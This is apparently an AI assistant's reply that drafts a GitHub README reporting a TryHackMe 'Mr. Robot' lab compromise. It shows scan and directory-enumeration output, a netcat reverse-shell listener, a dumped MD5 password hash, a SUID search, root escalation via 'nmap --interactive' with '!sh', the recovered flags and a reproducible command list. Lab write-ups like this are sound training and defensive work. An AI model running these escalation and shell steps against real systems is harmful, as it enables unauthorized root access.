Great — here’s a professional, GitHub-ready **`README.md`** you can drop straight into your repository.
It uses the *actual outputs* from your transcript (nmap, gobuster, nc, nmap --interactive) and includes placeholders for images named `mr.robot1.png` … `mr.robot12.png` inside an `images/` folder.

Copy the entire content below into `README.md` at your repo root and add your images to `images/`, then commit & push.

````markdown
# Mr. Robot — TryHackMe Penetration Test Report

![mr.robot1](images/mr.robot1.png)

---

## Executive Summary

**Engagement:** Authorized walkthrough / penetration test of the TryHackMe "Mr.Robot" machine  
**Target:** `10.10.199.99`  
**Assessment Date:** 2025-11-01  
**Author:** Your Name

This document is a factual, evidence-backed report based on the terminal transcript created during the lab. The assessment demonstrates full compromise from low-privileged access to root via a local privilege escalation vector. Immediate remediation is recommended.

**High-level findings**
- Initial access: reverse shell as `daemon`.  
- Credential discovery: `password.raw-md5` (MD5 hash for `robot`) found in `/home/robot`.  
- User access: SSH access to `robot` and retrieval of `key-2-of-3.txt`.  
- Privilege escalation: achieved `root` via `nmap --interactive`.  
- Flags recovered:
  - `key-2-of-3`: `822c73956184f694993bede3eb39f959`
  - `key-3-of-3`: `04787ddef27c3dee1ee161b21670b4e4`

**Risk rating:** HIGH — full system compromise demonstrated.

> **Warning:** This work was performed in a controlled, authorized lab environment (TryHackMe). Do not reuse these techniques against systems you do not own or have explicit permission to test.

---

## Table of Contents
1. Scope & Rules of Engagement  
2. Evidence: Command outputs  
3. Tools used  
4. Reconnaissance & enumeration  
5. Initial access (reverse shell)  
6. Local discovery & credentials  
7. Gaining `robot` user  
8. Privilege escalation to root (detailed)  
9. Reproducible commands (lab only)  
10. Findings, root cause & risk analysis  
11. Remediation recommendations  
12. Appendix — artifacts & flags

---

## 1. Scope & Rules of Engagement

![mr.robot2](images/mr.robot2.png)

- **Target IP:** `10.10.199.99`  
- **Environment:** TryHackMe training environment — authorized testing only.  
- **Allowed actions:** Scanning, enumeration, exploitation limited to this lab.  
- **Disallowed actions:** Attacks on infrastructure outside the lab, persistent backdoors outside lab scope.

---

## 2. Evidence: Command outputs (from transcript)

![mr.robot3](images/mr.robot3.png)

**Nmap (initial):**
```text
┌──(kali㉿kali)-[~/Desktop/mrrobot]
└─$ nmap 10.10.199.99 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-01 01:50 EDT
Nmap scan report for 10.10.199.99 (10.10.199.99)
Host is up (0.093s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 7.43 seconds
````

**Gobuster (directory enumeration):**

```text
┌──(kali㉿kali)-[~/Desktop/mrrobot]
└─$ gobuster -u 10.10.199.99 -w /usr/share/wordlists/dirb/common.txt dir
...
[+] Url:                     http://10.10.199.99
[+] Method:                  GET
[+] Threads:                  10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
Starting gobuster in directory enumeration mode
...
/.hta                 (Status: 403)
/.htaccess            (Status: 403)
/.htpasswd            (Status: 403)
/0                    (Status: 301) [--> http://10.10.199.99/0/]
/admin                (Status: 301) [--> http://10.10.199.99/admin/]
/blog                 (Status: 301) [--> http://10.10.199.99/blog/]
/dashboard            (Status: 302) [--> http://10.10.199.99/wp-admin/]
/index.html           (Status: 200) [Size: 1188]
/index.php            (Status: 301) [--> http://10.10.199.99/]
```

**Netcat listener & reverse shell (snippet):**

```text
┌──(kali㉿kali)-[~/Desktop/mrrobot]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
connect to [10.23.168.139] from (UNKNOWN) [10.10.199.99] 54086
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
daemon@ip-10-10-199-99:/$ whoami
daemon
```

**Discovery in `/home/robot`:**

```text
daemon@ip-10-10-199-99:/home/robot$ ls
key-2-of-3.txt  password.raw-md5

daemon@ip-10-10-199-99:/home/robot$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

**SSH to `robot` & reading key-2:**

```text
┌──(kali㉿kali)-[~/Desktop/mrrobot]
└─$ sudo ssh robot@10.10.199.99
[...]
$ ls
key-2-of-3.txt  password.raw-md5
$ cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

**SUID binaries and nmap interactive escalation:**

```text
$ find / -perm -u=s 2>/dev/null
[...]
/usr/local/bin/nmap

$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
root@ip-10-10-199-99:/home/ubuntu# whoami
root
root@ip-10-10-199-99:/root# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

---

## 3. Tools used

![mr.robot4](images/mr.robot4.png)

* `nmap` (scanning, interactive used during escalation)
* `gobuster` (web directory enumeration)
* `nc` (reverse shell listener)
* `python3` (pty.spawn for TTY upgrade)
* `ssh`, `ls`, `cat`, `find`, `sudo -l`, etc.

---

## 4. Reconnaissance & Enumeration

![mr.robot5](images/mr.robot5.png)

Summary:

* Ports open: 22 (SSH), 80 (HTTP), 443 (HTTPS).
* Web endpoints discovered (examples): `/admin`, `/blog`, `/dashboard` -> `/wp-admin/`.
* Evidence suggests WordPress site and potential admin interfaces.

---

## 5. Initial Access (reverse shell)

![mr.robot6](images/mr.robot6.png)

* Reverse shell connection received on attacker's listener (`nc -lvnp 2222`).
* Shell upgraded with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
* Acquired `daemon` context and discovered files in `/home/robot`.

---

## 6. Local discovery & credential handling

![mr.robot7](images/mr.robot7.png)

* `password.raw-md5` content: `robot:c3fcd3d76192e4007dfb496cca67e13b` (MD5).

  * MD5 is weak and trivial to crack with common wordlists.
* `key-2-of-3.txt` initially permission restricted when connected as `daemon`, read later as `robot`.

---

## 7. Getting `robot` user

![mr.robot8](images/mr.robot8.png)

* SSHed into the box as `robot` (credentials obtained during the exercise).
* Read `/home/robot/key-2-of-3.txt`:

  * `822c73956184f694993bede3eb39f959`

`robot` had no sudo privileges (`sudo -l` returned user may not run sudo).

---

## 8. Privilege escalation to root (detailed)

![mr.robot9](images/mr.robot9.png)

* `nmap` binary located at `/usr/local/bin/nmap` with elevated permissions.
* Using `nmap --interactive` and running `!sh` spawned a root shell.
* Root flag read: `/root/key-3-of-3.txt` → `04787ddef27c3dee1ee161b21670b4e4`

**Root cause:** interactive functionality of a privileged binary (nmap) allowed command execution as root. This is a configuration/security issue.

---

## 9. Reproducible Commands (lab-only)

![mr.robot10](images/mr.robot10.png)

> Execute only in authorized lab environments.

```bash
# Port scan
nmap -sC -sV -oN nmap_initial 10.10.199.99

# Directory enumeration
gobuster dir -u http://10.10.199.99 -w /usr/share/wordlists/dirb/common.txt -t 10

# Start listener for reverse shell
nc -lvnp 2222

# Upgrade received shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Check user home
cd /home/robot
ls -la
cat password.raw-md5

# Check SUID binaries
find / -perm -u=s 2>/dev/null

# Interactive nmap (lab only)
nmap --interactive
# at prompt: !sh
```

---

## 10. Findings, root cause & risk analysis

![mr.robot11](images/mr.robot11.png)

**Findings**

* Misconfigured/elevated interactive utility: `nmap` allowed a root shell.
* Weak credential handling: MD5 hash stored in a user home.
* Web-facing admin endpoints increase the attack surface.

**Impact**

* Full system compromise (user -> root). Confidentiality, integrity, and availability risk.

**Likelihood**

* High where legacy/incorrect tool installs and poor credential hygiene exist.

---

## 11. Remediation recommendations

![mr.robot12](images/mr.robot12.png)

1. **Fix privileged binaries**

   * Remove setuid from nonessential binaries. Example:

     ```bash
     chmod u-s /usr/local/bin/nmap
     ```
   * Update `nmap` to a secure build and avoid running interactive utilities with elevated privileges.

2. **Credential hygiene**

   * Do not store password hashes or plaintext in user home directories.
   * Use modern password hashing (bcrypt/argon2) and secrets management.

3. **Harden web applications**

   * Update WordPress core/plugins/themes.
   * Restrict admin interfaces (IP allowlist, MFA, WAF).

4. **Least privilege**

   * Review sudoers and user privileges; apply principle of least privilege.

5. **Monitoring & logging**

   * Alert for unexpected interactive shells and changes to SUID binaries.
   * File integrity monitoring for sensitive files.

---

## 12. Appendix — artifacts & flags

**Flags recovered (from transcript)**

* `key-2-of-3` — `/home/robot/key-2-of-3.txt` → `822c73956184f694993bede3eb39f959`
* `key-3-of-3` — `/root/key-3-of-3.txt` → `04787ddef27c3dee1ee161b21670b4e4`

**Hashes**

* `password.raw-md5` → `robot:c3fcd3d76192e4007dfb496cca67e13b`

---

## Repository setup instructions

1. Create an `images/` folder at repository root and add twelve images named:

   * `mr.robot1.png` through `mr.robot12.png` (placeholders included in the README).
2. Save this file as `README.md` in the repository root.
3. Commit and push:

   ```bash
   git add README.md images/
   git commit -m "Add Mr.Robot lab report README and images placeholders"
   git push origin main
   ```

---

## Contact & Attribution

**Author:** Your Name
**GitHub:** `https://github.com/yourusername`
**Date:** 2025-11-01

---

*This report reflects activities performed within a TryHackMe lab. Use responsibly — do not run these techniques outside authorized environments.*

```

تم — هذا **README.md** جاهز للاستخدام على GitHub.    
أريد أن أساعدك بالخطوة التالية أيضاً: تريدني أعمل واحد من الخيارات التالية الآن؟ (اختر رقم واحد)

1. جهّز repo ZIP (README + 12 placeholder PNGs) للتنزيل.  
2. أضع الملف مباشرة في المستند الذي أنشأته سابقًا هنا (موجود ضمن canvas).  
3. أقدّم أوامر Git كاملة (مع أمثلة `git remote add` و`git push`) إذا تريد رفعه للمرة الأولى.  

اختر رقم واحد وأنا أكمّل فورًا — ومرة ثانية، ممتاز شغلك 👏
```
